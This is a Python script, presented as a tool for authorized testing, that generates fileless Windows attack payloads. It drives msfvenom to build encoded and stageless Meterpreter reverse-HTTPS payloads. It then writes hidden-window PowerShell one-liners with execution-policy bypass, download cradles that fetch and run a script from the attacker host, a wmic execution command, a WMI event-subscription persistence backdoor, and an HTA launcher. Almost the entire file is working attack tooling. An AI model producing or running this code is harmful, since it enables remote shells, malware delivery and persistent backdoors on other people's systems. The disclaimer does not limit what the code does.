#!/usr/bin/env python3
"""
Fileless Payload Generator for Authorized Testing
Generates various fileless payload variants using Metasploit
"""

import subprocess
import base64
import sys
import os

class FilelessPayloadGenerator:
    def __init__(self, lhost, lport=4444):
        self.lhost = lhost
        self.lport = lport
        self.output_dir = "/home/cyber/fileless_test"

    def generate_base_payload(self):
        """Generate base PowerShell reflective payload"""
        print("[+] Generating base PowerShell reflective payload...")
        cmd = [
            "msfvenom",
            "-p", "windows/x64/meterpreter/reverse_https",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", "psh-reflection"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        output_file = f"{self.output_dir}/payload_base.ps1"
        with open(output_file, 'w') as f:
            f.write(result.stdout)
        print(f"[+] Saved to: {output_file}")
        return result.stdout

    def generate_encoded_payload(self):
        """Generate encoded payload for evasion"""
        print("[+] Generating encoded payload...")
        cmd = [
            "msfvenom",
            "-p", "windows/x64/meterpreter/reverse_https",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-e", "x64/xor_dynamic",
            "-i", "3",
            "-f", "psh-reflection"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        output_file = f"{self.output_dir}/payload_encoded.ps1"
        with open(output_file, 'w') as f:
            f.write(result.stdout)
        print(f"[+] Saved to: {output_file}")

    def generate_stageless_payload(self):
        """Generate stageless payload (more reliable)"""
        print("[+] Generating stageless payload...")
        cmd = [
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_https",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", "psh-reflection"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        output_file = f"{self.output_dir}/payload_stageless.ps1"
        with open(output_file, 'w') as f:
            f.write(result.stdout)
        print(f"[+] Saved to: {output_file}")

    def create_oneliner(self, payload_content):
        """Create PowerShell one-liner"""
        print("[+] Creating PowerShell one-liner...")

        # Base64 encode the payload
        encoded = base64.b64encode(payload_content.encode('utf-16le')).decode()

        oneliner = f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"

        output_file = f"{self.output_dir}/oneliner.txt"
        with open(output_file, 'w') as f:
            f.write(oneliner)
        print(f"[+] Saved to: {output_file}")
        print(f"[+] One-liner length: {len(oneliner)} characters")

    def create_download_cradle(self):
        """Create download cradle for remote execution"""
        print("[+] Creating download cradles...")

        cradles = {
            "webclient": f'powershell.exe -NoP -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://{self.lhost}:8000/payload.ps1\')"',
            "invoke_webrequest": f'powershell.exe -NoP -W Hidden -Command "IEX(Invoke-WebRequest -Uri http://{self.lhost}:8000/payload.ps1 -UseBasicParsing).Content"',
            "bits_transfer": f'powershell.exe -Command "Start-BitsTransfer -Source http://{self.lhost}:8000/payload.ps1 -Destination $env:TEMP\\p.ps1; IEX(Get-Content $env:TEMP\\p.ps1 -Raw)"'
        }

        output_file = f"{self.output_dir}/download_cradles.txt"
        with open(output_file, 'w') as f:
            for name, cradle in cradles.items():
                f.write(f"# {name.upper()}\n")
                f.write(f"{cradle}\n\n")

        print(f"[+] Saved to: {output_file}")

    def create_wmi_command(self, payload_file):
        """Create WMI-based execution command"""
        print("[+] Creating WMI execution commands...")

        with open(payload_file, 'r') as f:
            payload = f.read()

        # Compress and encode
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()

        wmi_cmd = f'wmic process call create "powershell.exe -NoP -W Hidden -Enc {encoded}"'

        output_file = f"{self.output_dir}/wmi_execution.txt"
        with open(output_file, 'w') as f:
            f.write("# WMI Process Call Create\n")
            f.write(f"{wmi_cmd}\n\n")
            f.write("# WMI Event Subscription (Persistence)\n")
            f.write("# This creates a persistent backdoor (use with caution in testing)\n")
            f.write(f'wmic /NAMESPACE:"\\\\\\\\.\\\\root\\\\subscription" PATH __EventFilter CREATE Name="SystemUpdate", EventNameSpace="root\\\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"\n')

        print(f"[+] Saved to: {output_file}")

    def create_hta_file(self, payload_content):
        """Create HTA file for execution"""
        print("[+] Creating HTA file...")

        hta_template = f"""<!DOCTYPE html>
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('http://{self.lhost}:8000/payload.ps1')""", 0, False
    window.close()
</script>
</head>
<body>
<h1>Loading...</h1>
</body>
</html>
"""

        output_file = f"{self.output_dir}/launcher.hta"
        with open(output_file, 'w') as f:
            f.write(hta_template)
        print(f"[+] Saved to: {output_file}")

    def generate_all(self):
        """Generate all payload variants"""
        print("[*] Fileless Payload Generator for Authorized Testing")
        print(f"[*] LHOST: {self.lhost}")
        print(f"[*] LPORT: {self.lport}")
        print()

        # Generate base payload
        payload_content = self.generate_base_payload()

        # Generate variants
        self.generate_encoded_payload()
        self.generate_stageless_payload()
        self.create_oneliner(payload_content)
        self.create_download_cradle()
        self.create_wmi_command(f"{self.output_dir}/payload_base.ps1")
        self.create_hta_file(payload_content)

        print()
        print("[+] All payloads generated successfully!")
        print(f"[+] Check {self.output_dir} for all files")
        print()
        print("[!] Remember: Use only in authorized testing environments!")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 generate_variants.py <LHOST> [LPORT]")
        print("Example: python3 generate_variants.py 192.168.1.100 4444")
        sys.exit(1)

    lhost = sys.argv[1]
    lport = sys.argv[2] if len(sys.argv) > 2 else 4444

    generator = FilelessPayloadGenerator(lhost, lport)
    generator.generate_all()
